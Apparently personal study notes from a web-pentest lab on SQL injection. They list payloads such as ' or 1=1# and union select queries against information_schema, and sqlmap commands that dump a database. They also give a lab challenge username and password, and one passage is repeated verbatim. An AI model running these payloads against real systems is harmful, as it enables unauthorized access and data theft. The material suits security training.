log into the app user creds posted
	send the Post request that get accepted as correct credentials to repeater
once in repeater try the common injection to see if you get a correct response
	- jeremy' or 1=1#
	- jeremy" or 1=1#

The payload needs to be exactly correct to work
	this is where we can bring in another tool to help
Sqlmap 
	sqlmap -r <txt file>
nothing looks exploitable

look around the application for something else
what is the application doing and how is it doing it
- The Webpage is trying to pull data from somewhere to display it on our screen or go start a process
- depending on the datavase, that could be SQL we can inject code into the applicaion
    - modifying sql commands to pull data from teh databases we should not be able to see
        - all users, user info, passwords of other users, etc
- How does it work?
- what are the developers trying to accomplish?

what to try

- try some quotes, multiple quotes, special characters to see how it works
- ex - Jermey’ or jermey” or jermey#
- jeremy’ or 1=1#
    - if you get results back - indication of SQL injection

Union

grab data from other table that may not be provided

jermey union select null, null, null#

use the “null” to see how many tables you can get back

ex - jeremy’ union select null,null,null,table_name from informiation_schema.tables#


can use <user>’ union select null,null,version()#

log into the app user creds posted send the Post request that get accepted as correct credentials to repeater once in repeater try the common injection to see if you get a correct response

- jeremy' or 1=1#
- jeremy" or 1=1#

The payload needs to be exactly correct to work this is where we can bring in another tool to help Sqlmap sqlmap -r <txt file> nothing looks exploitable

look around the application for something else what is the application doing and how is it doing it

testing the session parameter to see if it is vulnerable to injection

Using intruder to guess the first character of the password

Take the get request and copy and paste it into a txt file to put into sqlmap

sqlmap -r req.txt —level=2

(need level too for session tokens)

if you do not include level 2, you may get error like this


That will give us the code we can use on the report or to plug into burp

we can then use —dump to dump the database using that parameter

You can also use -T for the exact table name as shown her

SQL injection challenge

username: takeshi

Password: onigirigadaisuki



See additional notes with screenshots
https://www.notion.so/SQL-injection-72eb1ee0a3494cb69a2eea492951d403?pvs=4
